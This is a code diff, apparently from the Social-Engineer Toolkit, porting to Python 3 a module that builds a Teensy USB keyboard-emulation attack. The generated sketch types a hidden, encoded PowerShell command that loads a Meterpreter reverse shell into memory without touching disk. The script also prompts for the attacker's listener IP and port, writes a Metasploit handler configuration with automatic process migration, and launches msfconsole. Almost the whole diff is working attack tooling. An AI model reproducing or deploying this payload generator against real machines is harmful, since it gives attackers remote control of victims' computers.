@@ -1,61 +1,71 @@
 #!/usr/bin/python
-import pexpect
-from src.core.setcore import *
+# coding=utf-8
+import os
 import time
 
-print """
+import pexpect
+
+import src.core.setcore as core
+
+# Py2/3 compatibility
+# Python3 renamed raw_input to input
+try:
+    input = raw_input
+except NameError:
+    pass
+
+print("""
 The powershell - shellcode injection leverages powershell to send a meterpreter session straight into memory without ever touching disk.
 
 This technique was introduced by Matthew Graeber (http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html)
-"""
+""")
 
-# define standard metasploit payload
-payload = "windows/meterpreter/reverse_tcp"
+payload = input('Enter the payload name [or Enter for windows/meterpreter/reverse_http]: ')
+if payload == '':
+    payload = 'windows/meterpreter/reverse_http'
 
 # create base metasploit payload to pass to powershell.prep
-filewrite = file(setdir + "/metasploit.payload", "w")
-filewrite.write(payload)
-filewrite.close()
+with open(os.path.join(core.userconfigpath, "metasploit.payload"), 'w') as filewrite:
+    filewrite.write(payload)
 
-ipaddr = raw_input("Enter the IP for the reverse: ")
-port = raw_input("Enter the port for the reverse: ")
+ipaddr = input("Enter the IP of the LHOST: ")
+port = input("Enter the port for the LHOST: ")
 
-shellcode = generate_powershell_alphanumeric_payload(payload,ipaddr,port, "")
-filewrite = file(setdir + "/x86.powershell", "w")
-filewrite.write(shellcode)
-filewrite.close()
+shellcode = core.generate_powershell_alphanumeric_payload(payload, ipaddr, port, "")
+with open(os.path.join(core.userconfigpath, 'x86.powershell'), 'w') as filewrite:
+    filewrite.write(shellcode)
 
 time.sleep(3)
-fileopen = file(setdir + "/x86.powershell", "r")
+with open(os.path.join(core.userconfigpath, "x86.powershell")) as fileopen:
+    pass
+    # read in x amount of bytes
+    data_read = int(50)
 
-# read in x amount of bytes
-data_read = int(50)
+    output_variable = "#define __PROG_TYPES_COMPAT__\n#include <avr/pgmspace.h>\n"
 
-output_variable = "#include <avr/pgmspace.h>\n"
-
-counter = 0
-
-while 1:
-    reading_encoded = fileopen.read(data_read).rstrip()
-    if reading_encoded == "": break
-    output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_encoded)
-    counter = counter + 1
+    counter = 0
+    while True:
+        reading_encoded = fileopen.read(data_read).rstrip()
+        if not reading_encoded:
+            break
+        output_variable += 'const char RevShell_{0}[] = {{"{1}"}};\n'.format(counter, reading_encoded)
+        counter += 1
 
 rev_counter = 0
-output_variable += "PROGMEM const char *exploit[] = {\n"
+output_variable += "const char * exploit[] = {\n"
 
 while rev_counter != counter:
-    output_variable+="RevShell_%s" % rev_counter
-    rev_counter = rev_counter +1
+    output_variable += "RevShell_{0}".format(rev_counter)
+    rev_counter += 1
     if rev_counter == counter:
-        output_variable+="};\n"
-    if rev_counter != counter:
-        output_variable+=",\n"
+        output_variable += "};\n"
+    else:
+        output_variable += ",\n"
 
 teensy = output_variable
 
 # write the rest of the teensy code
-teensy+=("""
+teensy += ("""
 char buffer[55];
 int ledPin = 11;
 
@@ -68,7 +78,7 @@ void loop()
   delay(5000);
   CommandAtRunBar("cmd");
   delay(750);
-  Keyboard.print("powershell -nop -win hidden -noni -enc ");
+  Keyboard.print("%s");
   // Write the binary to the notepad file
   int i;
   for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
@@ -139,35 +149,42 @@ Keyboard.set_modifier(0);
 Keyboard.set_key1(0);
 Keyboard.send_now();
 }
-""")
-print "[*] Payload has been extracted. Copying file to %s/reports/teensy.pde" % (setdir)
-if not os.path.isdir(setdir + "/reports/"):
-    os.makedirs(setdir + "/reports/")
-filewrite = file(setdir + "/reports/teensy.pde", "w")
-filewrite.write(teensy)
-filewrite.close()
-choice = yesno_prompt("0","Do you want to start a listener [yes/no]: ")
+""" % (core.powershell_encodedcommand()))
+
+print("[*] Payload has been extracted. Copying file to root directory under reports/teensy.ino")
+
+if not os.path.isdir(os.path.join(core.userconfigpath, "reports")):
+    os.makedirs(os.path.join(core.userconfigpath, "reports"))
+with open(os.path.join(core.userconfigpath, "reports/teensy.ino"), "w") as filewrite:
+    filewrite.write(teensy)
+choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no] ")
 if choice == "YES":
 
-
     # Open the IPADDR file
-    if check_options("IPADDR=") != 0:
-        ipaddr = check_options("IPADDR=")
+    if core.check_options("IPADDR=") != 0:
+        ipaddr = core.check_options("IPADDR=")
     else:
-        ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
-        update_options("IPADDR=" + ipaddr)
+        ipaddr = input("LHOST IP address to connect back on: ")
+        core.update_options("IPADDR=" + ipaddr)
 
-    if check_options("PORT=") != 0:
-        port = check_options("PORT=")
+    if core.check_options("PORT=") != 0:
+        port = core.check_options("PORT=")
 
     else:
-        port = raw_input("Enter the port to connect back on: ")
+        port = input("Enter the port to connect back on: ")
 
-    filewrite = file(setdir + "/metasploit.answers", "w")
-    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j" % (payload,ipaddr,port))
-    filewrite.close()
-    print "[*] Launching Metasploit...."
+    with open(os.path.join(core.userconfigpath, "metasploit.answers"), "w") as filewrite:
+        filewrite.write("use multi/handler\n"
+                        "set payload {0}\n"
+                        "set LHOST {1}\n"
+                        "set LPORT {2}\n"
+                        "set AutoRunScript post/windows/manage/smart_migrate\n"
+                        "exploit -j".format(payload, ipaddr, port))
+
+    print("[*] Launching Metasploit....")
     try:
-        child = pexpect.spawn("%smsfconsole -r %s/metasploit.answers\r\n\r\n" % (meta_path(),setdir))
+        child = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(core.meta_path() + "msfconsole"),
+                                                          os.path.join(core.userconfigpath, "metasploit.answers")))
         child.interact()
-    except: pass
+    except:
+        pass
